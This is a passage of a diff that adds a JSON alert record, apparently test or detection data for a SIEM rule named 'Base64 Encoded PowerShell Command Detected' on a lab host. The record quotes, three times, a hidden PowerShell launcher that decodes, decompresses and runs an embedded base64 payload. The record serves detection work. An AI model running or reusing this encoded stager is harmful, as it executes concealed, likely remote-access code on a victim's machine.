wP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\" ¦ Proc: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ¦ PID: 4416 ¦ User: SRVDEFENDER01$ ¦ LID: 0x3e7",
+    "ExtraFieldInfo": "MandatoryLabel: SYSTEM_INTEGRITY ¦ ParentProcessName: C:\\Windows\\System32\\cmd.exe ¦ ProcessId: 5392 ¦ SubjectDomainName: OFFSEC ¦ SubjectUserSid: S-1-5-18 ¦ TargetDomainName: - ¦ TargetLogonId: 0x0 ¦ TargetUserName: - ¦ TargetUserSid: S-1-0-0 ¦ TokenElevationType: FULL_TOKEN",
+    "RuleID": "c03c42ba-1e4e-45c3-c0ba-c8d38b077ee7"
+   },
+   "host": "srvdefender01.offsec.lan",
+   "ecs": {
+    "winlog": {
+     "channel": "Security",
+     "event_data": {
+      "MandatoryLabel": "S-1-16-16384",
+      "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+      "ProcessId": "5392",
+      "SubjectDomainName": "OFFSEC",
+      "SubjectUserSid": "S-1-5-18",
+      "TargetLogonId": "0x0",
+      "TargetUserSid": "S-1-0-0",
+      "TokenElevationType": "%%1936",
+      "CommandLine": "powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"",
+      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "NewProcessId": "4416",
+      "SubjectUserName": "SRVDEFENDER01$",
+      "SubjectLogonId": "0x3e7"
+     },
+     "record_id": "354579"
+    },
+    "event": {
+     "provider": "Microsoft-Windows-Security-Auditing",
+     "code": "4688"
+    },
+    "process": {
+     "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "command_line": "powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"",
+     "pid": "4416"
+    },
+    "user": {
+     "name": "SRVDEFENDER01$"
+    },
+    "rule": {
+     "name": "Base64 Encoded PowerShell Command Detected",
+     "id": "c03c42ba-1e4e-45c3-c0ba-c8d38b077ee7",
+     "level": "high"
+    },
+    "host": {
+     "name": "srvdefender01.offsec.lan"
+    }
+   },
+   "ts": "2021-04-21T14:56:43Z",
+   "_id": "ce229c48fc713d22321a3c45fdd0024924b8be57"
+  }
+ ]
+}
